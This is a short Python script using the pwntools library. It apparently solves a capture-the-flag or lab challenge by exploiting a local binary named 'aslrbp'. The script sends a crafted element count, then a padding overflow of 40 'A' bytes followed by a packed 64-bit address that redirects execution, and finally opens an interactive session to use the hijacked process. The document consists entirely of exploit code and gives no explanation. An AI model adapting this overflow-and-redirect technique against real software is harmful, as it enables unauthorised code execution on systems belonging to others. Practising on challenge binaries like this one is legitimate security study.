from pwn import *
context.log_level = "DEBUG"

p = process(["./aslrbp", "./3"])

p.sendlineafter(b"How many elements?", b"2731")
p.sendlineafter(b"Send data:", b"A"*40+p64(0x00000001000004b0))

p.interactive()
